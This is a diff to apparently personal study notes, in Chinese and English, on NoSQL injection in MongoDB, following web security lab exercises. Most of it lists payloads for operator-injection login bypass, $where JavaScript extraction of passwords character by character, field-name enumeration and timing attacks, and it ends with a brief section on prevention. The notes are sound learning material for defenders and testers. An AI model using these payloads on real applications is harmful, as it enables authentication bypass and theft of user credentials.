@@ -58,13 +58,73 @@
 - {"username":{"$ne":"invalid"},"password":{"$ne":"invalid"}}
 - {"username":{"$in":["admin","administrator","superadmin"]},"password":{"$ne":""}}
 
-**Lab: Exploiting NoSQL operator injection to bypass authentication**
-- 
-## 擷取數據 
-- 將 JavaScript 函數注入查詢
-- 某些查詢運算子或函數可以執行有限的 JavaScript 程式碼
-- MongoDB 的$where運算子和mapReduce()函數。
+### Lab: Exploiting NoSQL operator injection to bypass authentication
+- {"username":"wiener"}
+- {"username":{"$ne":""}}
+- {"username":{"$regex":"wien.*"}}
+- {"username":{"$ne":""},"password":{"$ne":""}}
+- {"username":{"$regex":"admin.*"},"password":{"$ne":""}}
 
-**Example :** 
-- 傳回使用者密碼字串的第一個字符 : admin' && this.password[0] == 'a' || 'a'=='b
-- 識別密碼是否包含數字 : admin' && this.password.match(/\d/) || 'a'=='b
+## Exploiting syntax injection to extract data
+-  MongoDB 的$where運算子和mapReduce()函數。
+-  將 JavaScript 函數注入查詢
+-  **$where**
+    - {"$where":"this.username == 'admin'"}
+    - "admin' && this.password[0] == 'a' || 'a'=='b"
+    - match() : "admin' && this.password.match(/\d/) || 'a'=='b"
+
+### 識別 MongoDB 資料庫有效字段
+  - password字段:lookup?username=admin'+%26%26+this.password!%3d'
+  - admin' && this.username!='
+  - admin' && this.foo!='
+  - 執行字典攻擊
+### Lab: Exploiting NoSQL injection to extract data
+(*URL 編碼Ctrl-U*)
+- try get passwords 
+- GET /user/lookup?user=wiener
+- 有效的 JavaScript 負載 : wiener'+'
+- wiener' && '1'=='2 : should return could not found 
+- wiener' && '1'=='1
+- administrator' && this.password.length < 30 || 'a'=='b
+- administrator' && this.password.length < 8 || 'a'=='b
+- Intruder : administrator' && this.password[§0§]=='§a§
+  - Payloads : 0-9 / a-z
+  - Length : 為密碼的每個字元添加 0 到 7 之間的數字
+
+## Exploiting NoSQL operator injection to extract data
+- POST | 將$where運算子新增為附加參數
+- false : {"username":"wiener","password":"peter", "$where":"0"}
+- true  : {"username":"wiener","password":"peter", "$where":"1"}
+- keys()方法提取資料欄位的名稱
+  - "$where":"Object.keys(this)[0].match('^.{0}a.*')"
+  - 逐個字元地提取欄位名稱
+- $regex運算符
+  - {"username":"myuser","password":"mypass"}
+  - {"username":"admin","password":{"$regex":"^.*"}}
+  - {"username":"admin","password":{"$regex":"^a*"}}
+### Lab: Exploiting NoSQL operator injection to extract unknown fields
+- test is that have no sql 
+  - "invalid" --> {"$ne":"invalid"}
+- test $where
+  - test T/F
+    - 在 JSON 資料中新增"$where": "0"
+    - {"username":"carlos","password":{"$ne":"invalid"}, "$where": "0"}
+    - "$where": "0" -->  "$where": "1"
+  - get key() 
+    - "$where":"Object.keys(this)[1].match('^.{}.*')"
+    - "$where":"Object.keys(this)[1].match('^.{§§}§§.*')"
+  - Payload 0-20 : a-z、A-Z、0-9
+    -   "$where":"Object.keys(this)[2].match('^.{}.*')"
+-   GET /forgot-password?YOURTOKENNAME=TOKENVALUE
+
+## Timing based injection
+- 有時觸發資料庫錯誤不會導致應用程式回應發生變化
+- 故意延遲 : {"$where": "sleep(5000)"}
+- 如果密碼包含字母 a
+  - admin'+function(x){var waitTill = new Date(new Date().getTime() + 5000);while((x.password[0]==="a") && waitTill > new Date()){};}(this)+'
+  - admin'+function(x){if(x.password[0]==="a"){sleep(5000)};}(this)+'
+ 
+## Preventing NoSQL injection
+- 使用可接受字元的允許清單來清理和驗證使用者輸入。
+- 使用參數化查詢插入使用者輸入，而不是將使用者輸入直接連接到查詢。
+- 為了防止操作員注入，請套用可接受金鑰的允許清單。
